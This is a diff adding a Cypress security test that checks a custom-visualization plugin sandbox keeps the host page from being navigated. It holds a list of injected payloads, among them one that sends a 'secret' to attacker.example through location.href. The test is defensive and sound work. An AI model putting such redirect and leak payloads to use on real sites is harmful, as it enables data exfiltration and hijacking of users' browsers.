@@ -1880,6 +1880,48 @@ describe("sandbox", () => {
     }
   });
 
+  // `window.location` and the Location attributes are `[LegacyUnforgeable]`,
+  // and `near-membrane-dom` gives the plugin its own iframe realm with its
+  // own Location instance, so we can't intercept these at the membrane (see
+  // the comment in distortions-blocked-apis.ts). What we *can*  verify is that the host page is intact.
+  it("plugin location operations do not navigate the host", () => {
+    const payloads = [
+      'location.href = "https://attacker.example/?leak=secret";',
+      'location.assign("https://attacker.example/");',
+      'location.replace("https://attacker.example/");',
+      'window.location = "https://attacker.example/";',
+      'location.pathname = "/attacker-pwned";',
+      'location.search = "?attacker-pwned=1";',
+      'location.hash = "#attacker-pwned";',
+    ];
+    // Run inline in the bundle preamble. Each is wrapped in try/catch so an
+    // attempt that errors doesn't short-circuit the rest.
+    const attackBundle = payloads
+      .map((p) => `try { ${p} } catch (e) {}`)
+      .join("\n");
+
+    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
+      req.continue((res) => {
+        res.body = `${attackBundle}\n${String(res.body)};\n`;
+        res.send();
+      });
+    }).as("injectedBundle");
+
+    H.visitQuestion("@sandboxCardId");
+    cy.wait("@injectedBundle");
+
+    cy.findByRole("heading", {
+      name: "Custom viz rendered successfully",
+    }).should("be.visible");
+
+    cy.location("pathname").should("match", /\/question/);
+    cy.location("href").then((href) => {
+      expect(href).not.to.include("attacker");
+    });
+    cy.location("search").should("not.contain", "attacker-pwned");
+    cy.location("hash").should("not.contain", "attacker-pwned");
+  });
+
   // innerHTML/outerHTML/insertAdjacentHTML go through DOMPurify rather than
   // being blocked outright, so this case doesn't fit the "expect a thrown
   // error and a fallback viz" shape of SANDBOX_CASES. Instead we inject an
